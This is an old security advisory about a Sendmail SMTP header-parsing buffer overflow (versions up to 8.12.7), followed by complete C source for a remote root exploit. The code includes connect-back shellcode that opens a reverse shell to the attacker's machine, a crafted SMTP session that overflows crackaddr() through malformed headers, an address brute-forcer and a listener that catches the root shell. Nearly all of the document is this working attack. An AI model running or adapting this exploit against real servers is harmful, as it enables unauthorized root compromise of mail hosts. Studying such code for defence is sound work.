source: http://www.securityfocus.com/bid/6991/info
 
Sendmail is prone to a remotely buffer-overflow vulnerability in the SMTP header parsing component. Successful attackers may exploit this vulnerability to gain control of affected servers.
 
Reportedly, this vulnerability may be locally exploitable if the sendmail binary is setuid/setgid.
 
Sendmail 5.2 to 8.12.7 are affected. Administrators are advised to upgrade to 8.12.8 or to apply patches to earlier versions of the 8.12.x tree. 

/* Sendmail <8.12.8 crackaddr() exploit by bysin */
/*            from the l33tsecurity crew         */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

int maxarch=1;
struct arch {
	char *os;
	int angle,nops;
	unsigned long aptr;
} archs[] = {
	{"Slackware 8.0 with sendmail 8.11.4",138,1,0xbfffbe34}
};


/////////////////////////////////////////////////////////

#define LISTENPORT 2525
#define BUFSIZE 4096

char code[]=                    /* 116 bytes                      */
    "\xeb\x02"                  /* jmp    <shellcode+4>           */
    "\xeb\x08"                  /* jmp    <shellcode+12>          */
    "\xe8\xf9\xff\xff\xff"      /* call   <shellcode+2>           */
    "\xcd\x7f"                  /* int    $0x7f                   */
    "\xc3"                      /* ret                            */
    "\x5f"                      /* pop    %edi                    */
    "\xff\x47\x01"              /* incl   0x1(%edi)               */
    "\x31\xc0"                  /* xor    %eax,%eax               */
    "\x50"                      /* push   %eax                    */
    "\x6a\x01"                  /* push   $0x1                    */
    "\x6a\x02"                  /* push   $0x2                    */
    "\x54"                      /* push   %esp                    */
    "\x59"                      /* pop    %ecx                    */
    "\xb0\x66"                  /* mov    $0x66,%al               */
    "\x31\xdb"                  /* xor    %ebx,%ebx               */
    "\x43"                      /* inc    %ebx                    */
    "\xff\xd7"                  /* call   *%edi                   */
    "\xba\xff\xff\xff\xff"      /* mov    $0xffffffff,%edx        */
    "\xb9\xff\xff\xff\xff"      /* mov    $0xffffffff,%ecx        */
    "\x31\xca"                  /* xor    %ecx,%edx               */
    "\x52"                      /* push   %edx                    */
    "\xba\xfd\xff\xff\xff"      /* mov    $0xfffffffd,%edx        */
    "\xb9\xff\xff\xff\xff"      /* mov    $0xffffffff,%ecx        */
    "\x31\xca"                  /* xor    %ecx,%edx               */
    "\x52"                      /* push   %edx                    */
    "\x54"                      /* push   %esp                    */
    "\x5e"                      /* pop    %esi                    */
    "\x6a\x10"                  /* push   $0x10                   */
    "\x56"                      /* push   %esi                    */
    "\x50"                      /* push   %eax                    */
    "\x50"                      /* push   %eax                    */
    "\x5e"                      /* pop    %esi                    */
    "\x54"                      /* push   %esp                    */
    "\x59"                      /* pop    %ecx                    */
    "\xb0\x66"                  /* mov    $0x66,%al               */
    "\x6a\x03"                  /* push   $0x3                    */
    "\x5b"                      /* pop    %ebx                    */
    "\xff\xd7"                  /* call   *%edi                   */
    "\x56"                      /* push   %esi                    */
    "\x5b"                      /* pop    %ebx                    */
    "\x31\xc9"                  /* xor    %ecx,%ecx               */
    "\xb1\x03"                  /* mov    $0x3,%cl                */
    "\x31\xc0"                  /* xor    %eax,%eax               */
    "\xb0\x3f"                  /* mov    $0x3f,%al               */
    "\x49"                      /* dec    %ecx                    */
    "\xff\xd7"                  /* call   *%edi                   */
    "\x41"                      /* inc    %ecx                    */
    "\xe2\xf6"                  /* loop   <shellcode+81>          */
    "\x31\xc0"                  /* xor    %eax,%eax               */
    "\x50"                      /* push   %eax                    */
    "\x68\x2f\x2f\x73\x68"      /* push   $0x68732f2f             */
    "\x68\x2f\x62\x69\x6e"      /* push   $0x6e69622f             */
    "\x54"                      /* push   %esp                    */
    "\x5b"                      /* pop    %ebx                    */
    "\x50"                      /* push   %eax                    */
    "\x53"                      /* push   %ebx                    */
    "\x54"                      /* push   %esp                    */
    "\x59"                      /* pop    %ecx                    */
    "\x31\xd2"                  /* xor    %edx,%edx               */
    "\xb0\x0b"                  /* mov    $0xb,%al                */
    "\xff\xd7"                  /* call   *%edi                   */
;


void header() {
	printf("\nSendmail <8.12.8 crackaddr() exploit by bysin\n");
	printf("           from the l33tsecurity crew        \n\n");
}

void printtargets() {
	unsigned long i;
	header();
	printf("\t  Target\t Addr\t\t OS\n");
	printf("\t-------------------------------------------\n");
	for (i=0;i<maxarch;i++) printf("\t* %d\t\t 0x%08x\t %s\n",i,archs[i].aptr,archs[i].os);
	printf("\n");
}

void writesocket(int sock, char *buf) {
	if (send(sock,buf,strlen(buf),0) <= 0) {
		printf("Error writing to socket\n");
		exit(0);
	}
}

void readsocket(int sock, int response) {
	char temp[BUFSIZE];
	memset(temp,0,sizeof(temp));
	if (recv(sock,temp,sizeof(temp),0) <= 0) {
		printf("Error reading from socket\n");
		exit(0);
	}
	if (response != atol(temp)) {
		printf("Bad response: %s\n",temp);
		exit(0);
	}
}

int readutil(int sock, int response) {
	char temp[BUFSIZE],*str;
	while(1) {
		fd_set readfs;
		struct timeval tm;
		FD_ZERO(&readfs);
		FD_SET(sock,&readfs);
		tm.tv_sec=1;
		tm.tv_usec=0;
		if(select(sock+1,&readfs,NULL,NULL,&tm) <= 0) return 0;
		memset(temp,0,sizeof(temp));
		if (recv(sock,temp,sizeof(temp),0) <= 0) {
			printf("Error reading from socket\n");
			exit(0);
		}
		str=(char*)strtok(temp,"\n");
		while(str && *str) {
			if (atol(str) == response) return 1;
			str=(char*)strtok(NULL,"\n");
		}
	}
}

#define NOTVALIDCHAR(c) (((c)==0x00)||((c)==0x0d)||((c)==0x0a)||((c)==0x22)||(((c)&0x7f)==0x24)||(((c)>=0x80)&&((c)<0xa0)))

void findvalmask(char* val,char* mask,int len) {
	int i;
	unsigned char c,m;
	for(i=0;i<len;i++) {
		c=val[i];
		m=0xff;
		while(NOTVALIDCHAR(c^m)||NOTVALIDCHAR(m)) m--;
		val[i]=c^m;
		mask[i]=m;
	}
}

void fixshellcode(char *host, unsigned short port) {
	unsigned long ip;
	char abuf[4],amask[4],pbuf[2],pmask[2];
	if ((ip = inet_addr(host)) == -1) {
		struct hostent *hostm;
		if ((hostm=gethostbyname(host)) == NULL) {
			printf("Unable to resolve local address\n");
			exit(0);
		}
		memcpy((char*)&ip, hostm->h_addr, hostm->h_length);
	}
	abuf[3]=(ip>>24)&0xff;
	abuf[2]=(ip>>16)&0xff;
	abuf[1]=(ip>>8)&0xff;
	abuf[0]=(ip)&0xff;
	pbuf[0]=(port>>8)&0xff;
	pbuf[1]=(port)&0xff;
	findvalmask(abuf,amask,4);
	findvalmask(pbuf,pmask,2);
	memcpy(&code[33],abuf,4);
	memcpy(&code[38],amask,4);
	memcpy(&code[48],pbuf,2);
	memcpy(&code[53],pmask,2);
}

void getrootprompt() {
	int sockfd,sin_size,tmpsock,i;
	struct sockaddr_in my_addr,their_addr;
	char szBuffer[1024];
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		printf("Error creating listening socket\n");
		return;
	}
	my_addr.sin_family = AF_INET;
	my_addr.sin_port = htons(LISTENPORT);
	my_addr.sin_addr.s_addr = INADDR_ANY;
	memset(&(my_addr.sin_zero), 0, 8);
	if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) {
		printf("Error binding listening socket\n");
		return;
	}
	if (listen(sockfd, 1) == -1) {
		printf("Error listening on listening socket\n");
		return;
	}
	sin_size = sizeof(struct sockaddr_in);
	if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) {
		printf("Error accepting on listening socket\n");
		return;
	}
	writesocket(tmpsock,"uname -a\n");
	while(1) {
		fd_set readfs;
		FD_ZERO(&readfs);
		FD_SET(0,&readfs);
		FD_SET(tmpsock,&readfs);
		if(select(tmpsock+1,&readfs,NULL,NULL,NULL)) {
			int cnt;
			char buf[1024];
			if (FD_ISSET(0,&readfs)) {
				if ((cnt=read(0,buf,1024)) < 1) {
					if(errno==EWOULDBLOCK || errno==EAGAIN) continue;
                			else {
						printf("Connection closed\n");
						return;
					}
				}
				write(tmpsock,buf,cnt);
			}
			if (FD_ISSET(tmpsock,&readfs)) {
				if ((cnt=read(tmpsock,buf,1024)) < 1) {
					if(errno==EWOULDBLOCK || errno==EAGAIN) continue;
                			else {
						printf("Connection closed\n");
						return;
					}
				}
				write(1,buf,cnt);
			}
		}
	}
	close(tmpsock);
	close(sockfd);
	return;
}

int main(int argc, char **argv) {
	struct sockaddr_in server;
	unsigned long ipaddr,i,bf=0;
	int sock,target;
	char tmp[BUFSIZE],buf[BUFSIZE],*p;
	if (argc <= 3) {
		printf("%s <target ip> <myip> <target number> [bruteforce start addr]\n",argv[0]);
		printtargets();
		return 0;
	}
	target=atol(argv[3]);
	if (target < 0 || target >= maxarch) {
		printtargets();
		return 0;
	}
	if (argc > 4) sscanf(argv[4],"%x",&bf);

	header();

	fixshellcode(argv[2],LISTENPORT);
	if (bf && !fork()) {
		getrootprompt();
		return 0;
	}

bfstart:
	if (bf) {
		printf("Trying address 0x%x\n",bf);
		fflush(stdout);
	}
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		printf("Unable to create socket\n");
		exit(0);
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(25);
	if (!bf) {
		printf("Resolving address... ");
		fflush(stdout);
	}
	if ((ipaddr = inet_addr(argv[1])) == -1) {
		struct hostent *hostm;
		if ((hostm=gethostbyname(argv[1])) == NULL) {
			printf("Unable to resolve address\n");
			exit(0);
		}
		memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
	}
	else server.sin_addr.s_addr = ipaddr;
	memset(&(server.sin_zero), 0, 8);
	if (!bf) {
		printf("Address found\n");
		printf("Connecting... ");
		fflush(stdout);
	}
	if (connect(sock,(struct sockaddr *)&server, sizeof(server)) != 0) {
		printf("Unable to connect\n");
		exit(0);
	}
	if (!bf) {
		printf("Connected!\n");
		printf("Sending exploit... ");
		fflush(stdout);
	}
	readsocket(sock,220);
	writesocket(sock,"HELO yahoo.com\r\n");
	readsocket(sock,250);
	writesocket(sock,"MAIL FROM: spiderman@yahoo.com\r\n");
	readsocket(sock,250);
	writesocket(sock,"RCPT TO: MAILER-DAEMON\r\n");
	readsocket(sock,250);
	writesocket(sock,"DATA\r\n");
	readsocket(sock,354);
	memset(buf,0,sizeof(buf));
	p=buf;
	for (i=0;i<archs[target].angle;i++) {
		*p++='<';
		*p++='>';
	}
	*p++='(';
	for (i=0;i<archs[target].nops;i++) *p++=0xf8;
	*p++=')';
	*p++=((char*)&archs[target].aptr)[0];
	*p++=((char*)&archs[target].aptr)[1];
	*p++=((char*)&archs[target].aptr)[2];
	*p++=((char*)&archs[target].aptr)[3];
	*p++=0;
	sprintf(tmp,"Full-name: %s\r\n",buf);
	writesocket(sock,tmp);
	sprintf(tmp,"From: %s\r\n",buf);
	writesocket(sock,tmp);

	p=buf;
	archs[target].aptr+=4;
	*p++=((char*)&archs[target].aptr)[0];
	*p++=((char*)&archs[target].aptr)[1];
	*p++=((char*)&archs[target].aptr)[2];
	*p++=((char*)&archs[target].aptr)[3];

	for (i=0;i<0x14;i++) *p++=0xf8;
	archs[target].aptr+=0x18;
	*p++=((char*)&archs[target].aptr)[0];
	*p++=((char*)&archs[target].aptr)[1];
	*p++=((char*)&archs[target].aptr)[2];
	*p++=((char*)&archs[target].aptr)[3];

	for (i=0;i<0x4c;i++) *p++=0x01;
	archs[target].aptr+=0x4c+4;
	*p++=((char*)&archs[target].aptr)[0];
	*p++=((char*)&archs[target].aptr)[1];
	*p++=((char*)&archs[target].aptr)[2];
	*p++=((char*)&archs[target].aptr)[3];

	for (i=0;i<0x8;i++) *p++=0xf8;
	archs[target].aptr+=0x08+4;
	*p++=((char*)&archs[target].aptr)[0];
	*p++=((char*)&archs[target].aptr)[1];
	*p++=((char*)&archs[target].aptr)[2];
	*p++=((char*)&archs[target].aptr)[3];

	for (i=0;i<0x20;i++) *p++=0xf8;
	for (i=0;i<strlen(code);i++) *p++=code[i];

	*p++=0;
	sprintf(tmp,"Subject: AAAAAAAAAAA%s\r\n",buf);
	writesocket(sock,tmp);
	writesocket(sock,".\r\n");
	if (!bf) {
		printf("Exploit sent!\n");
		printf("Waiting for root prompt...\n");
		if (readutil(sock,451)) printf("Failed!\n");
		else getrootprompt();
	}
	else {
		readutil(sock,451);
		close(sock);
		bf+=4;
		goto bfstart;
	}
}